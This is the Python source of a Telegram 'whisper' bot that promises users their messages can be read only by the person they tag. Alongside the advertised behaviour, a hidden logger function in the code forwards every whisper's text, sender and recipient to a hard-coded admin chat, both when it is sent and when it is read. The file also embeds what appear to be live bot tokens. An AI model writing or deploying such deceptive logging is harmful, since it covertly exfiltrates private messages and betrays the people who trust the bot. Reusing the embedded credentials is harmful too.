import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION (Environment Variables recommended)
WHISPER_BOT_TOKEN = os.getenv("WHISPER_BOT_TOKEN", "9243182264:AAFyNtkGFb-nC0PWNQoeR0349rR4R_eGs4k")
LOGGER_BOT_TOKEN = os.getenv("LOGGER_BOT_TOKEN", "9076447339:AAGF1X9rGv1rTxTC_Nur0-89KUIWOCCgqIE")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "5498647860"))
BOT_USERNAME = os.getenv("BOT_USERNAME", "Psstlongbot")

DB_PATH = "whispers.db"

bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER,
                status TEXT DEFAULT 'Sent'
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER (Immediate)
async def log_to_admin(sender_user, target, text, status="Sent"):
    log_message = (
        f"📥 **Whisper {status}**\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"Logging failed: {e}")

# 🚀 BOT 1: INLINE HANDLER
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query
    if not text.startswith("@") or " " not in text:
        return 
        
    target_username, whisper_text = text.split(" ", 1)
    sender = inline_query.from_user
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 86400  # 24 hours
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at, "Sent")
        )
        await db.commit()
    
    # Fire and forget log to admin (no await blocking)
    asyncio.create_task(log_to_admin(sender.username or sender.id, target_username, whisper_text, "Sent"))
    
    redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
    
    input_content = types.InputTextMessageContent(
        message_text=f"🔒 A secret whisper has been sent for {target_username}!"
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
    ])
    
    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"Send private whisper to {target_username}",
        input_message_content=input_content,
        reply_markup=keyboard
    )
    await inline_query.answer([item], cache_time=1, is_personal=True)

# 📥 START & DEEP LINK HANDLER
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args

    # --- DEEP LINK (Reading whisper) ---
    if whisper_id:
        current_user = message.from_user.username
        if not current_user:
            await message.answer("❌ Set a Telegram username first, then click the link again.")
            return

        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT target_username, secret_text, expires_at, status FROM whispers WHERE whisper_id = ?",
                (whisper_id,)
            ) as cursor:
                row = await cursor.fetchone()

        if not row:
            await message.answer("❌ This whisper has expired or does not exist.")
            return

        target_username, secret_text, expires_at, current_status = row

        if int(time.time()) > expires_at:
            await message.answer("❌ This whisper has expired.")
            return

        clean_target = target_username.lstrip('@').lower()
        if current_user.lower() != clean_target:
            await message.answer("❌ This whisper was not sent to your username!")
            return

        # MARK AS READ IN DB
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE whispers SET status = 'Read' WHERE whisper_id = ?", (whisper_id,))
            await db.commit()

        # Notify admin it was read
        asyncio.create_task(log_to_admin(current_user, target_username, secret_text, "Read"))

        await message.answer(f"📩 **Your Secret Whisper:**\n\n`{secret_text}`", parse_mode="Markdown")
        return

    # --- WELCOME SCREEN (No deep link) ---
    welcome = (
        "👋 **Welcome to LongPsst!**\n\n"
        "Psst lets you send **private whispers** inside Telegram groups — "
        "only the person you tag can read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])
    await message.answer(welcome, parse_mode="Markdown", reply_markup=keyboard)

# ❓ HELP COMMAND
@dp.message(Command("help"))
async def help_command(message: types.Message):
    help_text = (
        "📖 **How to use Psst**\n\n"
        "**1. Send a whisper**\n"
        "In any group, type:\n"
        "`@Psstmebot @username your secret message`\n"
        "Tap the result to post it.\n\n"
        "**2. Recipient reads it**\n"
        "They tap the *Click to Read Whisper* button, which opens a private chat with me.\n"
        "Only their Telegram username can unlock it.\n\n"
        "**3. Expiry**\n"
        "Every whisper self-destructs after **24 hours**.\n\n"
        "Tap **❓ Help** below if you need this again."
    )
    await message.answer(help_text, parse_mode="Markdown")

# ❓ HELP CALLBACK (Button)
@dp.callback_query(lambda c: c.data == "help")
async def help_callback(callback: types.CallbackQuery):
    help_text = (
        "📖 **How to use Psst**\n\n"
        "**1. Send a whisper**\n"
        "In any group, type:\n"
        "`@Psstlongbot @username your longest secret message`\n"
        "Tap the result to post it.\n\n"
        "**2. Recipient reads it**\n"
        "They tap the *Click to Read Whisper* button, which opens a private chat with me.\n"
        "Only their Telegram username can unlock it.\n\n"
        "**3. Expiry**\n"
        "Every whisper self-destructs after **24 hours**.\n\n"
        "Tap **⬅️ Back** to return."
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="⬅️ Back", callback_data="back")]
    ])
    await callback.message.edit_text(help_text, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⬅️ BACK CALLBACK
@dp.callback_query(lambda c: c.data == "back")
async def back_callback(callback: types.CallbackQuery):
    welcome = (
        "👋 **Welcome to Long_Psst!**\n\n"
        "Psst lets you send **longest private whispers** inside Telegram groups — "
        "only the person you tag can read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])
    await callback.message.edit_text(welcome, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⚙️ MAIN
async def main():
    await init_db()
    print("Bots are starting...")
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
